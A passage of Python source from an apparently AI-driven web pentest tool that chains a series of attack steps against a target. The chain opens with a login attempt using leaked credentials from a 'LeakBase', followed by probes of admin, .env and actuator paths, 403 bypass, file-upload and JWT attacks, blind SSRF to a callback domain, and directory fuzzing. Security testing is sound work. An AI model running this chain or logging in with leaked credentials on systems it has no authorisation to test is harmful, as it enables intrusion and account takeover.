        # ── Step 0.5: LEAKBASE — pentest boshlashdan oldin credential search ──
        # Topshiriq 3: LeakBase-dan target tekshiriladi
        leakbase_result  = {"found": False, "successful_logins": [], "session_updated": False}
        leakbase_scanner = LeakBaseScanner(self.client, self.ai)
        # login URL — args-dan yoki auto-detect
        leak_login_url   = ""
        if self.args.auth_url:
            leak_login_url = urllib.parse.urljoin(target+"/", self.args.auth_url.lstrip("/"))

        leakbase_result = leakbase_scanner.scan(target, login_url=leak_login_url)

        if leakbase_result["successful_logins"]:
            # ✅ Muvaffaqiyatli login — authenticated pentest
            best_login = leakbase_result["successful_logins"][0]
            console.print(
                f"\n[bold green]━━ LEAKBASE: AUTHENTICATED ━━[/bold green]\n"
                f"  [bold green]✅ Login muvaffaqiyatli: "
                f"{best_login['username']}:{best_login['password'][:8]}...[/bold green]"
            )
            self.session.logged_in = True
            self.session.username  = best_login["username"]
            # Session propagate qilindi (LeakBaseScanner ichida)

            # Agar auth_url berilmagan bo'lsa — avtomatik topilgan URL ishlatiladi
            if not self.args.auth_url:
                detected_login = leakbase_scanner._detect_login_url(target)
                self.args.auth_url = urllib.parse.urlparse(detected_login).path

        elif leakbase_result["found"] and not leakbase_result["successful_logins"]:
            # ⚠ Topildi lekin login ishlamadi
            console.print(
                f"\n[yellow]  ⚠ LeakBase: {len(leakbase_result['credentials'])} ta "
                f"credential topildi lekin hech biri hozir ishlamaydi. "
                f"Oddiy pentest davom etadi.[/yellow]"
            )
        else:
            # ℹ Topilmadi
            console.print(f"\n  [dim]  LeakBase: topilmadi — oddiy pentest[/dim]")

        # ── Step 1: Session ───────────────────────────────────────────────────
        session_mgr = SessionManager(self.client, self.ai)
        if self.args.auth_url:
            login_url = urllib.parse.urljoin(target+"/", self.args.auth_url.lstrip("/"))
            console.print(f"\n[cyan]━━ SESSION SETUP ━━[/cyan]")

            if self.args.user and self.args.password:
                session_mgr.add_role("user", login_url, self.args.user, self.args.password)
                u = session_mgr.roles.get("user")
                if u and u.logged_in:
                    # FIXED: properly propagate session to all components
                    self._propagate_session(u.session)

            if self.args.admin_user and self.args.admin_pass:
                session_mgr.add_role("admin", login_url, self.args.admin_user, self.args.admin_pass)
                a = session_mgr.roles.get("admin")
                if a and a.logged_in:
                    self._propagate_session(a.session)

        # ── Step 2: Baseline ──────────────────────────────────────────────────
        console.print(f"\n[cyan]━━ FINGERPRINTING ━━[/cyan]")
        baseline = BaselineEngine(self.client)
        baseline.build_custom_404(target)
        profile  = baseline.build_smart_profile(target, self.ai, depth=3)

        # ── Step 3: Crawl ─────────────────────────────────────────────────────
        console.print(f"\n[cyan]━━ CRAWL ━━[/cyan]")
        crawler  = Crawler(self.client, self.ai, target)
        endpoints= crawler.crawl(max_depth=3 if self.args.deep else 2)
        self.ctx.site_tech = crawler.site_tech
        console.print(f"[bold]Tech detected:[/bold] {self.ctx.site_tech}")

        # ── Step 4: Param discovery ───────────────────────────────────────────
        console.print(f"\n[cyan]━━ PARAM DISCOVERY ━━[/cyan]")
        discoverer = ParamDiscoverer(self.client)
        enriched   : List[Endpoint] = []
        # Template-based dedup for enrichment too
        seen_templates: dict = {}
        for ep in endpoints[:MAX_URLS]:
            t = ep.template or _normalize_url_template(ep.url)
            cnt = seen_templates.get(t, 0)
            if cnt >= 1: continue  # max 1 per template — same pattern, different IDs waste time
            seen_templates[t] = cnt + 1
            ep2 = discoverer.discover(ep)
            enriched.append(ep2)
        console.print(f"[green]✓ {len(enriched)} unique endpoint templates[/green]")

        # ── Step 5: Page analysis ─────────────────────────────────────────────
        console.print(f"\n[cyan]━━ PAGE ANALYSIS ━━[/cyan]")
        page_cache   : dict = {}
        extra_endpoints: list = []
        total_pages = len(enriched)
        ai_page_priority_urls: Set[str] = set()
        if total_pages:
            try:
                prioritized_for_page = self.ai.plan_endpoints(enriched)
            except Exception as e:
                console.print(f"  [dim yellow]  page priority fallback (heuristic): {e}[/dim yellow]")
                prioritized_for_page = sorted(enriched, key=lambda e: -e.score)
            ai_page_budget = max(
                PAGE_ANALYSIS_PRIORITY_MIN,
                int(math.ceil(total_pages * PAGE_ANALYSIS_PRIORITY_RATIO)),
            )
            ai_page_budget = min(total_pages, ai_page_budget, PAGE_ANALYSIS_PRIORITY_MAX)
            ai_page_priority_urls = {ep.url for ep in prioritized_for_page[:ai_page_budget]}
            console.print(
                f"  [dim]  AI page analysis scope: "
                f"{len(ai_page_priority_urls)}/{total_pages} priority endpoint(s)[/dim]"
            )
        for idx, ep in enumerate(enriched, start=1):
            r = page_cache.get(ep.url)
            if r is None:
                r = self.client.get(ep.url)
                page_cache[ep.url] = r
            if r["status"] == 0:
                if idx % PAGE_ANALYSIS_PROGRESS_EVERY == 0 or idx == total_pages:
                    console.print(f"  [dim]  analyzed {idx} of {total_pages}[/dim]")
                continue
            is_200   = baseline.is_real_200(r)
            if ep.url not in ai_page_priority_urls:
                # Non-priority endpoints are still fetched/cached (for Source Code Review),
                # but skip expensive per-page AI analysis here.
                if is_200.get("real"):
                    ep.score += 4
                if r["status"] in (401, 403):
                    ep.score += 10
                if RiskScorer.score_body(r.get("body", "")):
                    ep.score += 18
                if idx % PAGE_ANALYSIS_PROGRESS_EVERY == 0 or idx == total_pages:
                    console.print(f"  [dim]  analyzed {idx} of {total_pages}[/dim]")
                continue
            try:
                analysis = self.ai.analyze_page(ep.url, r["status"], r["body"], r["headers"], is_200)
            except Exception as e:
                console.print(f"  [dim red]  Page analysis error on {ep.url}: {e}[/dim red]")
                analysis = {}
            if analysis.get("is_custom_404"):
                ep.score = 0
                if idx % PAGE_ANALYSIS_PROGRESS_EVERY == 0 or idx == total_pages:
                    console.print(f"  [dim]  analyzed {idx} of {total_pages}[/dim]")
                continue
            risk = analysis.get("risk","Info")
            ep.score += {"Critical":40,"High":25,"Medium":10}.get(risk,0)
            for child in analysis.get("suggested_child_paths",[]):
                extra_endpoints.append(target.rstrip("/")+child)
            # Add AI-recommended tests to params
            for test in analysis.get("recommended_tests",[]):
                ep.params[f"ai_recommended:{test}"] = "1"
            if idx % PAGE_ANALYSIS_PROGRESS_EVERY == 0 or idx == total_pages:
                console.print(f"  [dim]  analyzed {idx} of {total_pages}[/dim]")

        for eu in list(set(extra_endpoints))[:20]:
            if eu in crawler.visited: continue
            er = self.client.get(eu)
            crawler.visited.add(eu)
            if er["status"] in (200,201,202):
                nep = Endpoint(url=eu, method="GET", discovered_by="ai_suggest",
                               template=_normalize_url_template(eu))
                nep.score = RiskScorer.score_url(eu) + 15
                nep = discoverer.discover(nep)
                enriched.append(nep)

        console.print(f"\n[cyan]━━ SOURCE CODE REVIEW ━━[/cyan]")
        src_reviewer = SourceCodeReviewer(
            client=self.client,
            ai=self.ai,
            console_obj=console,
            finding_class=Finding,
        )
        src_findings = src_reviewer.scan(
            endpoints=enriched,
            page_cache=page_cache,
            target=target,
        )
        if src_findings:
            console.print(
                f"  [bold red]  🔎 {len(src_findings)} source/config finding(s) found "
                f"during source review![/bold red]"
            )

        # ACL bypass findings from crawler
        acl_findings: List[Finding] = []
        for bypass in crawler.acl_findings:
            has_ai = bool(bypass.get("ai_reason") and bypass.get("confidence",0)>=MIN_CONFIDENCE)
            acl_findings.append(Finding(
                owasp_id="A01",owasp_name="Broken Access Control",
                title=f"ACL Bypass: {urllib.parse.urlparse(bypass['child_200']).path}",
                risk="High",confidence=bypass.get("confidence",75),
                url=bypass["child_200"],method="GET",param="URL_PATH",
                payload=bypass["child_200"],
                evidence=f"Parent restricted: {bypass['parent_403']}. Child accessible. AI: {bypass.get('ai_reason','')}",
                baseline_diff="parent403→child200",
                tool_output=bypass["body_snippet"][:400],
                request_raw=f"GET {bypass['child_200']}",
                response_raw=bypass["body_snippet"][:400],
                exploit_cmd=f"curl -v '{bypass['child_200']}'",
                remediation="Enforce access control at every path level recursively.",
                confirmed=has_ai,tool="acl_bypass",
            ))

        # BAC multi-role
        bac_findings = list(acl_findings)
        if len(session_mgr.roles) >= 2:
            console.print(f"\n[cyan]━━ BAC MULTI-ROLE ━━[/cyan]")
            for ep in enriched[:40]:
                bac = session_mgr.detect_bac(ep.url, ep.method)
                if bac:
                    ai_bac = self.ai.analyze_bac(bac)
                    if ai_bac and ai_bac.get("found") and ai_bac.get("confidence",0)>=MIN_CONFIDENCE:
                        bac_findings.append(Finding(
                            owasp_id=ai_bac.get("owasp_id","A01"),
                            owasp_name=ai_bac.get("owasp_name","BAC"),
                            title=ai_bac.get("title","BAC via role comparison"),
                            risk=ai_bac.get("risk","High"),confidence=ai_bac.get("confidence",70),
                            url=ep.url,method=ep.method,param="role_context",
                            payload="multi-role comparison",
                            evidence=ai_bac.get("technical",""),
                            baseline_diff=json.dumps(bac["comparisons"])[:200],tool_output="",
                            request_raw=f"{ep.method} {ep.url}",
                            response_raw=json.dumps(bac["responses"])[:300],
                            exploit_cmd=ai_bac.get("exploit_cmd",""),
                            remediation=ai_bac.get("remediation",""),
                        ))

        # ── Step 6: AI Planning ───────────────────────────────────────────────
        console.print(f"\n[cyan]━━ AI PLANNER ━━[/cyan]")
        planned = self.ai.plan_endpoints(enriched)
        planned = self._collapse_equivalent_endpoints_for_agentic(planned, page_cache)
        console.print(f"[green]✓ AI prioritized {len(planned)} endpoints[/green]")

        # ── Step 7: OWASP Fuzzing (Agentic Loop) ─────────────────────────────
        console.print(f"\n[cyan]━━ AGENTIC OWASP FUZZING ━━[/cyan]")
        kali    = KaliToolRunner(self.session)
        fuzzer  = OWASPFuzzEngine(
            self.client, baseline, kali, self.ai, self.ctx,
            oob=self.oob if oob_domain else None
        )
        limit   = len(planned) if self.args.deep else min(len(planned), 35)
        all_findings: List[Finding] = list(bac_findings)
        all_findings.extend(src_findings)

        # CSRF on login forms (auth endpoints)
        oauth_findings: List[Finding] = []
        if self.args.auth_url:
            lr  = self.client.get(urllib.parse.urljoin(target+"/", self.args.auth_url.lstrip("/")))
            body = lr.get("body","")
            if not re.search(r'<input[^>]+name=["\'](?:csrf|_token|csrfmiddlewaretoken)["\']', body, re.I) \
               and "<form" in body.lower():
                oauth_findings.append(Finding(
                    owasp_id="A01",owasp_name="Broken Access Control",
                    title=f"Login form missing CSRF token",
                    risk="Medium",confidence=75,
                    url=urllib.parse.urljoin(target+"/",self.args.auth_url.lstrip("/")),
                    method="GET",param="csrf_token",payload="missing",
                    evidence="Login form has no CSRF token",
                    baseline_diff="csrf_missing",tool_output=body[:300],
                    request_raw=f"GET {self.args.auth_url}",response_raw=body[:300],
                    exploit_cmd="# Forge form submission from external site",
                    remediation="Add CSRF token to login form.",
                    tool="csrf_check",
                ))
        all_findings.extend(oauth_findings)

        # Smart dir fuzz
        if shutil.which("ffuf") or shutil.which("gobuster"):
            console.print(f"\n[cyan]━━ SMART DIR FUZZ ━━[/cyan]")
            dir_hits = self._smart_dir_fuzz(target, kali, baseline, profile, self.ai)
            all_findings.extend(dir_hits)

        # Parallel endpoint fuzzing
        lock = threading.Lock()
        sema = threading.Semaphore(MAX_WORKERS)
        threads = []

        def fuzz_ep(ep: Endpoint):
            try:
                with sema:
                    results = fuzzer.test_endpoint(ep)
                    with lock: all_findings.extend(results)
            except Exception as e:
                console.print(f"  [dim red]  Thread error: {e}[/dim red]")

        for ep in planned[:limit]:
            if ep.score <= 0: continue
            console.print(f"[dim]  ▶ {ep.method} {ep.url} (score:{ep.score:.0f})[/dim]")
            t = threading.Thread(target=fuzz_ep, args=(ep,), daemon=True)
            threads.append(t); t.start()

        for t in threads: t.join(timeout=200)

        # ── Step 8: Nuclei ────────────────────────────────────────────────────
        if not getattr(self.args,"no_nuclei",False):
            console.print(f"\n[cyan]━━ NUCLEI ━━[/cyan]")
            all_findings.extend(NucleiRunner().run(target, self.ctx.site_tech, self.session))

        # ── Step 9: Recursive 403 bypass ─────────────────────────────────────
        if not getattr(self.args,"no_403",False):
            console.print(f"\n[cyan]━━ RECURSIVE 403 BYPASS ━━[/cyan]")
            bypasser = Recursive403Bypasser(self.client, self.ai)

            # Collect ALL forbidden sources:
            # 1. crawler.forbidden — paths that returned 403/401 during crawl
            # 2. auth_walls — pages that showed "login required" body signal
            # 3. enriched endpoints that return 403 right now (re-check)
            # 4. high-value paths that were NOT visited at all (admin, api, etc.)
            forbidden_set: Set[str] = set()

            # Source 1: crawler forbidden paths
            for p in crawler.forbidden:
                if p:
                    forbidden_set.add(target.rstrip("/") + (p if p.startswith("/") else f"/{p}"))

            # Source 2: auth wall pages
            for aw in crawler.auth_walls:
                forbidden_set.add(aw["url"].rstrip("/"))

            # Source 3: re-check enriched endpoints that are 403 NOW
            for ep in enriched:
                if ep.url in forbidden_set: continue
                # Only re-check high-value endpoints (don't waste time on all)
                if ep.score >= 30:
                    live = self.client.get(ep.url)
                    if live.get("status") in (401, 403):
                        forbidden_set.add(ep.url)

            # Source 4: probe well-known high-value paths that were never visited
            high_value_paths = [
                "/admin", "/administrator", "/admin/panel", "/admin/dashboard",
                "/admin/users", "/admin/config", "/admin/settings",
                "/api/admin", "/api/v1/admin", "/api/v2/admin",
                "/dashboard", "/management", "/manager", "/panel",
                "/internal", "/private", "/secure", "/restricted",
                "/staff", "/moderator", "/superuser", "/root",
                "/config", "/settings", "/system", "/debug",
                "/actuator", "/actuator/env", "/actuator/beans",
                "/.env", "/backup", "/logs",
            ]
            for p in high_value_paths:
                full_url = target.rstrip("/") + p
                if full_url in crawler.visited: continue
                r = self.client.get(full_url)
                crawler.visited.add(full_url)
                if r.get("status") in (401, 403):
                    forbidden_set.add(full_url)
                    console.print(f"  [yellow]🔒 {r['status']} {full_url}[/yellow] [dim]— added to bypass queue[/dim]")
                elif r.get("status") in (200, 206):
                    # Directly accessible — add as endpoint for fuzzing
                    nep = Endpoint(url=full_url, method="GET",
                                   discovered_by="high_value_probe",
                                   template=_normalize_url_template(full_url))
                    nep.score = RiskScorer.score_url(full_url) + 30
                    nep = discoverer.discover(nep)
                    enriched.append(nep)
                    console.print(f"  [green]✓ Direct access: {full_url}[/green]")

            forbidden = list(forbidden_set)[:40]
            console.print(f"  [dim]{len(forbidden)} forbidden URLs to probe[/dim]")

            # Run bypass on each forbidden URL
            bypassed_endpoints: List[Endpoint] = []
            for url in forbidden:
                console.print(f"  [dim]  → Bypassing: {url}[/dim]")
                bypass_hits = bypasser.bypass(url, max_depth=3)
                all_findings.extend(bypass_hits)

                # KEY FIX: for each successful bypass, create an Endpoint and
                # run full OWASP fuzzing on it — SQLi/XSS/LFI etc.
                for f in bypass_hits:
                    if f.confirmed or f.confidence >= 70:
                        bypassed_url = f.url
                        if not any(e.url == bypassed_url for e in bypassed_endpoints):
                            bep = Endpoint(
                                url=bypassed_url, method="GET",
                                discovered_by="bypass_confirmed",
                                template=_normalize_url_template(bypassed_url),
                            )
                            bep.score = 95  # highest priority
                            bep = discoverer.discover(bep)
                            bypassed_endpoints.append(bep)
                            console.print(
                                f"  [bold green]  ↳ Bypass confirmed — queuing for full OWASP fuzz: {bypassed_url}[/bold green]"
                            )

            # Full OWASP fuzz on bypassed endpoints
            if bypassed_endpoints:
                console.print(f"\n[cyan]━━ FUZZING BYPASSED ENDPOINTS ({len(bypassed_endpoints)}) ━━[/cyan]")
                for bep in bypassed_endpoints[:10]:
                    console.print(f"  [bold]→ Full scan: {bep.url}[/bold]")
                    try:
                        bypass_findings = fuzzer.test_endpoint(bep)
                        all_findings.extend(bypass_findings)
                        # Tag findings as coming from bypassed endpoint
                        for bf in bypass_findings:
                            bf.chain.append(f"Via 403 bypass: {bep.url}")
                    except Exception as e:
                        console.print(f"  [dim red]  Fuzz error on bypassed endpoint: {e}[/dim red]")

        # ── Step 10: Upload attack ────────────────────────────────────────────
        if not getattr(self.args,"no_upload",False):
            upload_eps = [ep for ep in enriched if any(
                x in ep.url.lower() for x in ["upload","file","image","avatar","import","attach"]
            )]
            if upload_eps:
                console.print(f"\n[cyan]━━ FILE UPLOAD ━━[/cyan]")
                uploader = FileUploadAttacker(self.client, self.ai)
                for ep in upload_eps[:5]:
                    all_findings.extend(uploader.attack(ep.url, self.ctx.site_tech))

        # ── Step 11: JWT attack ───────────────────────────────────────────────
        if self.session.jwt_token:
            console.print(f"\n[cyan]━━ JWT ATTACK ━━[/cyan]")
            jwa = JWTAttacker(self.client, self.oob if oob_domain else None)
            all_findings.extend(jwa.attack(self.session.jwt_token, enriched[:25]))

        # ── Step 12: WebSocket ────────────────────────────────────────────────
        ws_eps = [ep for ep in enriched if ep.url.startswith(("ws://","wss://"))]
        if ws_eps:
            console.print(f"\n[cyan]━━ WEBSOCKET ━━[/cyan]")
            wst = WebSocketTester(self.ai)
            for ep in ws_eps[:3]:
                all_findings.extend(wst.test(ep.url))

        # ── Step 13: Interceptor ──────────────────────────────────────────────
        if enriched:
            console.print(f"\n[cyan]━━ INTERCEPTOR ━━[/cyan]")
            interceptor = RequestInterceptor(self.client, self.ai, self.ctx)
            all_findings.extend(interceptor.analyze_endpoints(enriched))

        # ── Step 14: OOB blind detection ──────────────────────────────────────
        if oob_domain:
            console.print(f"\n[cyan]━━ OOB BLIND ━━[/cyan]")
            all_findings.extend(self._oob_detection(enriched, oob_domain))
            self.oob.stop()

        # Confidence gate (pre-filter)
        before = len(all_findings)
        all_findings = [f for f in all_findings if f.confidence >= MIN_CONFIDENCE]
        if (before - len(all_findings)):
            console.print(f"  [dim]  Confidence gate: dropped {before-len(all_findings)} low-conf findings[/dim]")

        # ── Step 15: FP Filter FIRST — so FPs don't corrupt correlation ──────
        # FIX: FP-lar correlation signallarini buzmasligi uchun avval filter qilinadi
        console.print(f"\n[cyan]━━ FP FILTER ━━[/cyan]")
        fp_filter = FPFilter(self.ai, self.client,
                              memory=self.memory,
                              tech=self.ctx.site_tech)
        clean     = fp_filter.filter(all_findings)
        console.print(f"[green]✓ {len(clean)} kept, {len(all_findings)-len(clean)} FPs removed[/green]")

        # ── Step 16: Correlate on clean findings only ─────────────────────────
        console.print(f"\n[cyan]━━ CORRELATE ━━[/cyan]")
        clean = Correlator(self.ai).correlate(clean, self.ctx.signals)

        # ── Step 17: Report ───────────────────────────────────────────────────
        console.print(f"\n[cyan]━━ REPORT ━━[/cyan]")
        # Web-panel data enrichment (output-only; does not change scan logic)
        endpoint_analysis = []
        try:
            for ep in sorted(enriched, key=lambda e: float(getattr(e, "score", 0.0) or 0.0), reverse=True)[:120]:
                sc = float(getattr(ep, "score", 0.0) or 0.0)
                endpoint_analysis.append(
                    {
                        "url": ep.url,
                        "category": ep.discovered_by or "discovered",
                        "useful": bool(sc >= 35),
                        "score": round(sc, 2),
                        "reason": f"method={ep.method} depth={ep.depth} template={ep.template or _normalize_url_template(ep.url)} auth_required={ep.auth_required}",
                    }
                )
        except Exception:
            endpoint_analysis = []

        scan_log_lines = [
            f"Target: {target}",
            f"Mode: {self.args.mode}  Deep: {bool(self.args.deep)}",
            f"Endpoints discovered: {len(enriched)}",
            f"Findings (post confidence gate): {len(all_findings)}",
            f"Findings kept (post FP filter + correlate): {len(clean)}",
        ]

        assessment = self.ai.final_assessment(clean, target, self.ctx.site_tech)

        self.reporter.save(
            all_findings,
            scan_log=scan_log_lines,
            endpoint_analysis=endpoint_analysis,
            ai_analysis=assessment or "",
            meta={
                "mode": self.args.mode,
                "deep": bool(self.args.deep),
                "speed": ("deep" if bool(self.args.deep) else "medium"),
                "site_tech": dict(self.ctx.site_tech or {}),
                "scan_started_at": scan_started_at.isoformat(),
                "scan_finished_at": datetime.datetime.now().isoformat(),
                "template_path": getattr(self.args, "report_template", ""),
            },
        )
        self._print_summary(clean, all_findings)

        # ── Memory + KB save ─────────────────────────────────────────────────
        console.print(f"\n[cyan]━━ SAVING MEMORY & KNOWLEDGE ━━[/cyan]")
        self.memory.save()
        self.memory.print_summary()
        self.kb.save()

        # Scan ID
        scan_id = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

        # KB chat — agar --chat flag berilgan bo'lsa
        if getattr(self.args, "chat", False):
            console.print(f"\n[bold cyan]━━ KNOWLEDGE BASE ADVISOR ━━[/bold cyan]")
            console.print(
                f"  [dim]Scan natijalarini muhokama qiling. "
                f"AI o'rganadi va keyingi scanlarda qo'llaydi.[/dim]"
            )
            self.kb.chat(scan_id=scan_id, target=target)

        # ── AI Final Assessment ───────────────────────────────────────────────
        console.print(f"\n[cyan]━━ AI ASSESSMENT ━━[/cyan]")
        if assessment and len(assessment) > 50:
            if HAS_RICH:
                from rich.panel import Panel
                console.print(Panel(assessment,title="🔍 AI Security Assessment",border_style="cyan",padding=(1,2)))
            else:
                print("\n" + assessment)

        return clean

    def _propagate_session(self, source: SessionContext):
        """FIXED: Properly copy session cookies/headers to main session."""
        self.session.cookies.update(source.cookies)
        self.session.headers.update(source.headers)
        if source.jwt_token:
            self.session.jwt_token = source.jwt_token
        if source.csrf_token:
            self.session.csrf_token = source.csrf_token
        self.session.logged_in = True
        self.session.username  = source.username
        self.session.role      = source.role
        console.print(f"  [dim]  Session propagated: cookies={list(self.session.cookies.keys())}[/dim]")

    def _oob_detection(self, endpoints: List[Endpoint], oob_domain: str) -> List[Finding]:
        findings    = []
        oob_payloads = self.oob.payloads(token="ptest")
        ssrf_names   = {"url","redirect","src","dest","target","next","callback","load","fetch","path"}
        for ep in endpoints[:20]:
            for param in (ep.params or {}).keys():
                if param.split(":")[-1].lower() not in ssrf_names: continue
                test_url = f"{ep.url}?{param.split(':')[-1]}={oob_payloads['ssrf']}"
                self.client.get(test_url)
                time.sleep(0.5)
                if self.oob.check(token="ptest", wait=1.0):
                    findings.append(Finding(
                        owasp_id="A10",owasp_name="SSRF",
                        title=f"Blind SSRF (OOB): {ep.url} [{param}]",
                        risk="High",confidence=95,
                        url=ep.url,method=ep.method,param=param,
                        payload=oob_payloads["ssrf"],
                        evidence=f"OOB callback received from {oob_domain}",
                        baseline_diff="oob",tool_output=f"interactsh: {oob_domain}",
                        request_raw=f"GET {test_url}",response_raw="OOB callback",
                        exploit_cmd=f"curl '{test_url}'",
                        remediation="Whitelist allowed URLs. Block internal IPs.",
                        confirmed=True,oob=True,tool="oob",
                    ))
                    console.print(f"  [bold red]🎯 Blind SSRF OOB: {ep.url}[/bold red]")
        return findings

    def _smart_dir_fuzz(self, target: str, kali: KaliToolRunner,
                        baseline: BaselineEngine, profile: SmartFuzzProfile,
                        ai: AIEngine) -> List[Finding]:
        findings: List[Finding] = []
        visited_dirs: set = set()
        queue_dirs = [target.rstrip("/")]
        depth = 0
        wl    = WordlistScanner.best("dirs", max_size_mb=3.0)
        if not wl:
            console.print("  [dim yellow]  No dir wordlist — skipping[/dim yellow]")
            for fallback in [
                "/usr/share/wordlists/dirb/common.txt",
                "/usr/share/dirb/wordlists/common.txt",
                "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
            ]:
                if Path(fallback).exists():
                    wl = fallback
                    console.print(f"  [dim]  Dir fuzz wordlist (fallback): {fallback}[/dim]")
                    break
        if not wl or not Path(wl).exists():
            console.print("  [dim red]  Dir fuzz: wordlist topilmadi — skip[/dim red]")
            return findings
        global_max_time = 300
        per_level_time = 90
        scan_start = time.time()

        while queue_dirs and depth <= profile.depth:
            elapsed = time.time() - scan_start
            if elapsed > global_max_time:
                console.print(f"  [yellow]  Dir fuzz stopped: {elapsed:.0f}s (max {global_max_time}s)[/yellow]")
                break
            critical_count = sum(1 for f in findings if f.risk == "Critical")
            if critical_count >= 2:
                console.print(
                    f"  [bold red]  Dir fuzz stopped: {critical_count} Critical findings topildi[/bold red]"
                )
                break
            batch = list(queue_dirs); queue_dirs = []
            for base_dir in batch:
                if base_dir in visited_dirs:
                    continue
                visited_dirs.add(base_dir)
                remaining = global_max_time - (time.time() - scan_start)
                level_time = min(per_level_time, int(remaining))
                if level_time < 15:
                    console.print("  [dim]  Dir fuzz: vaqt tugadi[/dim]")
                    break
                cur_p = profile if depth==0 else baseline.build_smart_profile(base_dir, ai, depth=profile.depth)
                result = kali.smart_ffuf(base_dir, wl, cur_p, mode="dir", max_time_seconds=level_time)
                if not result.get("available", True):
                    continue
                raw_hits = result.get("results", [])
                max_analyze = max(30, int(os.environ.get("DIR_FUZZ_MAX_ANALYZE", "120")))
                per_signature_cap = max(1, int(os.environ.get("DIR_FUZZ_MAX_PER_SIGNATURE", "4")))
                per_template_cap = max(1, int(os.environ.get("DIR_FUZZ_MAX_PER_TEMPLATE", "2")))
                per_body_cap = max(1, int(os.environ.get("DIR_FUZZ_MAX_PER_EXACT_BODY", "1")))
                hits_to_analyze: List[dict] = []
                fp_count: Dict[tuple, int] = {}
                for hit in raw_hits:
                    fp = (
                        hit.get("status", 0),
                        hit.get("size", 0),
                        hit.get("words", 0),
                        hit.get("lines", 0),
                    )
                    used = fp_count.get(fp, 0)
                    if used >= per_signature_cap:
                        continue
                    fp_count[fp] = used + 1
                    hits_to_analyze.append(hit)
                    if len(hits_to_analyze) >= max_analyze:
                        break
                if len(raw_hits) > len(hits_to_analyze):
                    console.print(
                        f"  [yellow]  Dir fuzz smart-sampling: total={len(raw_hits)}, "
                        f"signature={len(fp_count)}, analyzed={len(hits_to_analyze)}, "
                        f"skipped={len(raw_hits)-len(hits_to_analyze)}[/yellow]"
                    )
                level_findings: List[Finding] = []
                processed = 0
                skipped_default = 0
                skipped_template = 0
                skipped_body = 0
                batch_started = time.time()
                last_progress = batch_started
                progress_every = max(25, min(200, max(1, len(hits_to_analyze) // 10)))
                time_limit_hit = False
                template_seen: Dict[tuple, int] = {}
                exact_body_seen: Dict[tuple, int] = {}
                exact_body_verdicts: Dict[tuple, dict] = {}
                for hit in hits_to_analyze:
                    if (time.time() - scan_start) > global_max_time:
                        console.print(
                            f"  [yellow]  Dir fuzz stopped mid-batch: "
                            f"time budget {global_max_time}s tugadi[/yellow]"
                        )
                        time_limit_hit = True
                        break
                    hit_url  = hit.get("url") or f"{base_dir}/{hit.get('input','')}".replace("//","/")
                    hit_size = hit.get("size",0)
                    hit_st   = hit.get("status",0)
                    hit_words = hit.get("words", 0)
                    hit_lines = hit.get("lines", 0)

                    # Likely default/placeholder response (same shape as ffuf baseline) -> skip early.
                    size_like_default = any(abs(hit_size - s) <= max(8, cur_p.tolerance_bytes) for s in (cur_p.filter_sizes or []))
                    words_like_default = any(abs(hit_words - w) <= 2 for w in (cur_p.filter_words or []))
                    lines_like_default = any(abs(hit_lines - ln) <= 1 for ln in (cur_p.filter_lines or []))
                    if size_like_default and (words_like_default or lines_like_default):
                        skipped_default += 1
                        processed += 1
                        continue

                    r        = self.client.get(hit_url)
                    body     = r.get("body","")
                    body_hash = hashlib.md5(body.encode("utf-8", errors="replace")).hexdigest()
                    body_sig = (hit_st, body_hash)
                    cached_body_verdict = exact_body_verdicts.get(body_sig)
                    if cached_body_verdict is not None:
                        if cached_body_verdict.get("is_directory") and depth < profile.depth:
                            nd = hit_url.rstrip("/")
                            if nd not in visited_dirs:
                                queue_dirs.append(nd)
                        skipped_body += 1
                        processed += 1
                        continue
                    seen_body = exact_body_seen.get(body_sig, 0)
                    if seen_body >= per_body_cap:
                        skipped_body += 1
                        processed += 1
                        continue
                    exact_body_seen[body_sig] = seen_body + 1

                    # Template dedupe: header/footer/navbar/content shell bir xil bo'lsa
                    # faqat bir necha representative URL AI orqali tahlil qilinadi.
                    title_m = re.search(r'<title[^>]*>(.*?)</title>', body, re.I | re.S)
                    title = (title_m.group(1).strip().lower() if title_m else "")[:120]
                    norm = re.sub(r"\d{2,}", "#", body.lower())
                    norm = re.sub(r"\s+", " ", norm).strip()
                    head = norm[:140]
                    tail = norm[-140:] if len(norm) > 140 else norm
                    tpl_sig = (
                        hit_st,
                        hit_size // 32,
                        hit_words // 5,
                        hit_lines // 3,
                        title,
                        head,
                        tail,
                    )
                    seen = template_seen.get(tpl_sig, 0)
                    if seen >= per_template_cap:
                        skipped_template += 1
                        processed += 1
                        continue
                    template_seen[tpl_sig] = seen + 1

                    verdict  = ai.analyze_dir_hit(
                        hit_url, hit_st, hit_size, hit_words, hit_lines, body, cur_p
                    )
                    exact_body_verdicts[body_sig] = verdict
                    if verdict.get("is_sensitive") and verdict.get("confidence",0)>=MIN_CONFIDENCE:
                        c = verdict.get("risk","Info")
                        cl = {"Critical":"bold red","High":"red","Medium":"yellow","Low":"cyan"}.get(c,"dim")
                        console.print(f"  [{cl}]  🎯 {hit_url}[/{cl}] [dim]{c} — {verdict.get('reason','')}[/dim]")
                        finding = Finding(
                            owasp_id=verdict.get("owasp_id","A05"),
                            owasp_name=verdict.get("owasp_name","Security Misconfiguration"),
                            title=verdict.get("title",f"Exposed: {hit_url}"),
                            risk=c, confidence=verdict.get("confidence",50),
                            url=hit_url, method="GET", param="URL_PATH", payload="",
                            evidence=verdict.get("reason",""),
                            baseline_diff=f"status={hit_st} size={hit_size}",
                            tool_output=body[:300],
                            request_raw=f"GET {hit_url}",
                            response_raw=body[:400],
                            exploit_cmd=f"curl -v '{hit_url}'",
                            remediation=verdict.get("remediation","Restrict access."),
                        )
                        findings.append(finding)
                        level_findings.append(finding)
                    if verdict.get("is_directory") and depth < profile.depth:
                        nd = hit_url.rstrip("/")
                        if nd not in visited_dirs:
                            queue_dirs.append(nd)
                    processed += 1
                    now = time.time()
                    if processed % progress_every == 0 or (now - last_progress) >= 12:
                        elapsed_batch = max(0.1, now - batch_started)
                        rate = processed / elapsed_batch
                        remain = max(0, len(hits_to_analyze) - processed)
                        eta = int(remain / rate) if rate > 0 else 0
                        console.print(
                            f"  [dim]  Dir fuzz progress: {processed}/{len(hits_to_analyze)} "
                            f"(findings={len(level_findings)}, queue={len(queue_dirs)}, eta~{eta}s)[/dim]"
                        )
                        last_progress = now
                if skipped_default or skipped_template or skipped_body:
                    console.print(
                        f"  [dim]  Dir fuzz skipped: default_like={skipped_default}, "
